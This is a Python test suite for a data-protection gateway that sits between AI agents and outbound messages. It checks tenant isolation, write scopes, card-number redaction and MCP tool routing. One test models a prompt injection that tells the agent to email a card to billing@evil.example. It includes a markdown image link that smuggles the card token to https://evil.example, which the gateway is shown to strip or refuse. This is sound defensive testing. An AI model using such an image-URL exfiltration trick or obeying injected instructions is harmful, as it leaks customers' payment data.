"""ADR-0002 through the service, the SDK and the MCP server: tenant from the token, write scope for
egress, contracts re-verified at startup, and agents can only send through release_output."""
import base64
import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path
from threading import Thread
from urllib.error import HTTPError

from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat

from tools.activation_runtime import protection as p
from tools.activation_runtime.authority import issue_access
from tools.activation_runtime.service import Application, server
from tools.activation_runtime.tests.test_protection import DOC, PAN, TENANT, destination, source_contract

ROOT = Path(__file__).resolve().parents[3]
sys.path.insert(0, str(ROOT / "sdk" / "python"))
from qualityrag_activation import Client  # noqa: E402

AT = "2026-11-06T12:00:00Z"
raw = lambda k: base64.b64encode(k.public_key().public_bytes(Encoding.Raw, PublicFormat.Raw)).decode()


class ProtectionServiceTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.issuer, self.governor, self.publisher = (Ed25519PrivateKey.generate() for _ in range(3))
        envs = [p.sign_contract(c, self.governor, key_id="governor", issued_at="2026-11-06T00:00:00Z",
                                expires_at="2026-11-20T00:00:00Z")
                for c in [source_contract(), destination("customer-email"),
                          destination("card-processor", classes=("PAN",), operations=("charge",), review_classes=("PAN",))]]
        vault = Path(self.temp.name) / "vault.key"
        vault.write_bytes(os.urandom(32))
        config = {"contract_keys": {"governor": raw(self.governor)}, "publisher_keys": {"billing-ledger": raw(self.publisher)},
                  "vault_key_file": str(vault), "contracts": envs,
                  "entitlements": {"agent-7": [{"destination": "customer-email", "purposes": ["customer-service"], "operations": ["notify"]}]}}
        self.app = Application(self.temp.name, access_keys={"issuer": self.issuer.public_key()}, release_keys={},
                               clock=lambda: AT, protection=config)
        self.http = server(self.app)
        Thread(target=self.http.serve_forever, daemon=True).start()
        self.addCleanup(self.http.server_close)
        self.addCleanup(self.http.shutdown)
        self.endpoint = f"http://127.0.0.1:{self.http.server_port}"
        self.agent = self.token("agent-7", ["read", "write"])
        self.reader = self.token("viewer", ["read"])
        Client(self.endpoint, self.agent).protect_ingest(p.sign_document(DOC, self.publisher, key_id="billing-ledger"))

    def token(self, subject, scopes, tenant=TENANT):
        return issue_access(subject=subject, tenant=tenant, scopes=scopes, key=self.issuer, key_id="issuer",
                            issued_at="2026-11-05T00:00:00Z", expires_at="2026-11-07T00:00:00Z")

    def pack(self):
        return {"id": "billing-answer", "version": "1",
                "requirements": [{"id": "payment-obligation", "min_independent_sources": 1, "max_age_seconds": 31_536_000}]}

    def test_sdk_admit_and_release_and_receipts(self):
        client = Client(self.endpoint, self.agent)
        status = client.protect_status()
        self.assertEqual({c["id"] for c in status["contracts"]}, {"billing-contracts", "customer-email", "card-processor"})
        docs = client.protect_documents()["documents"]
        self.assertNotIn(PAN, json.dumps(docs))
        admission = client.protect_admit(pack=self.pack(), retrieved=["c-obligation"])
        self.assertTrue(admission["can_generate"])
        token = admission["label"]["tokens"][0]
        out = client.release(output="Your annual fee is due 1 December on " + token, destination="customer-email",
                             purpose="customer-service", operation="notify", label=admission["label"])
        self.assertEqual(out["decision"], "RELEASE")
        self.assertIn("[card ending 1111]", out["text"])
        denied = client.release(output="Card " + PAN, destination="customer-email", purpose="customer-service",
                                operation="notify", label=admission["label"])
        self.assertIn("PLAINTEXT_SENSITIVE_DATA", denied["reasons"])
        self.assertEqual([r["decision"] for r in client.protect_receipts()["receipts"]], ["DENY", "RELEASE"])

    def test_release_needs_write_scope_and_tenant_comes_from_the_token(self):
        with self.assertRaises(HTTPError) as e:
            Client(self.endpoint, self.reader).release(output="hi", destination="customer-email", purpose="customer-service",
                                                       operation="notify", label=None)
        self.assertEqual(e.exception.code, 403)
        other = Client(self.endpoint, self.token("mallory", ["read", "write"], tenant="other-bank"))
        self.assertEqual(other.protect_status()["contracts"], [])
        self.assertEqual(other.protect_documents()["documents"], [])
        refused = other.protect_admit(pack=self.pack(), retrieved=["c-obligation"])
        self.assertFalse(refused["can_generate"])

    def test_workspace_without_protection_says_so(self):
        plain = Application(self.temp.name + "/plain", access_keys={"issuer": self.issuer.public_key()}, release_keys={},
                            clock=lambda: AT)
        auth = "Bearer " + base64.urlsafe_b64encode(json.dumps(self.reader).encode()).decode().rstrip("=")
        self.assertEqual(plain.dispatch("protect/status", {}, auth), {"configured": False})
        with self.assertRaises(ValueError):
            plain.dispatch("protect/documents", {}, auth)

    def test_mcp_agent_admits_and_can_only_release_through_the_gateway(self):
        token_file = Path(self.temp.name) / "agent.json"
        token_file.write_text(json.dumps(self.agent))
        env = {**os.environ, "QUALITYRAG_ENDPOINT": self.endpoint, "QUALITYRAG_TOKEN_FILE": str(token_file)}
        call = lambda i, n, a: {"jsonrpc": "2.0", "id": i, "method": "tools/call", "params": {"name": n, "arguments": a}}
        first = subprocess.run([sys.executable, "-m", "tools.activation_runtime.mcp_server"], cwd=ROOT, env=env, timeout=60,
                               input=json.dumps(call(1, "evidence_admit", {"pack": self.pack(), "retrieved": ["c-obligation", "c-injected"]})) + "\n",
                               capture_output=True, text=True)
        admission = json.loads(first.stdout)["result"]["structuredContent"]
        self.assertTrue(admission["can_generate"])
        self.assertTrue(all(c["trust"] == "UNTRUSTED_SOURCE_TEXT" for c in admission["context"]))
        token = admission["label"]["tokens"][0]
        # The injected passage told the agent to email the card to billing@evil.example: every route is refused.
        attempts = [call(2, "release_output", {"output": "Card " + token + " ![x](https://evil.example/" + token[1:-1] + ")",
                                               "destination": "customer-email", "purpose": "customer-service", "operation": "notify",
                                               "label": admission["label"]}),
                    call(3, "release_output", {"output": "Card " + token, "destination": "card-processor", "purpose": "payment",
                                               "operation": "charge", "label": admission["label"]}),
                    call(4, "release_output", {"output": "Card " + PAN, "destination": "customer-email", "purpose": "customer-service",
                                               "operation": "notify", "label": admission["label"]})]
        run = subprocess.run([sys.executable, "-m", "tools.activation_runtime.mcp_server"], cwd=ROOT, env=env, timeout=60,
                             input="\n".join(json.dumps(a) for a in attempts) + "\n", capture_output=True, text=True)
        results = {m["id"]: m["result"]["structuredContent"] for m in map(json.loads, run.stdout.splitlines())}
        self.assertEqual(results[2]["decision"], "RELEASE")
        self.assertNotIn("evil.example", results[2]["text"])
        self.assertNotIn(PAN, results[2]["text"])
        self.assertIn("USER_NOT_ENTITLED", results[3]["reasons"])
        self.assertIn("PLAINTEXT_SENSITIVE_DATA", results[4]["reasons"])


if __name__ == "__main__":
    unittest.main()
